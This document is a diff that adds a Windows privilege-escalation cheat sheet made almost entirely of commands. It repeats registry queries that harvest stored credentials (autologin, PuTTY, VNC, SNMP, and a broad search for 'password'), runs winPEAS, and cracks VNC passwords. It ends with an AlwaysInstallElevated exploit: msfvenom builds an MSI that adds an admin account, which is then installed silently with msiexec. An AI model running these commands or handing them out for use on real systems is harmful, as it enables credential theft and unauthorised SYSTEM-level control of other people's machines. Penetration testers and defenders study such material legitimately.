@@ -1,1 +1,77 @@
+Search the registry for key names and passwords
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+
+AutoLogon
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+Passwords in Registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+.\winPEASany.exe quiet filesinfo userinfo
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+        
+Registry
+Sometimes developers and admins store passwords of services in the registry. 
+
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+    --> crack password with vncpwd.exe
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername 
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+# SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+    #NOTE: if you get redirected, use that redirect 
+    reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+AlwaysInstallElevated
+
+When the AlwaysInstallElevated key is set for both HKLM and HKCU in the registry, every newly installed program automatically obtains system privileges. We just have to install our payload and we have system. Can it get easier for us?
+
+Detect if vulnerable:
+
+#check if AlwaysInstallElevated key is set 
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+Exploit
+
+#generate payload 
+    #No uac format
+    msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi 
+    #Using the msiexec the uac wont be prompted
+    msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi 
+
+#install msi file 
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
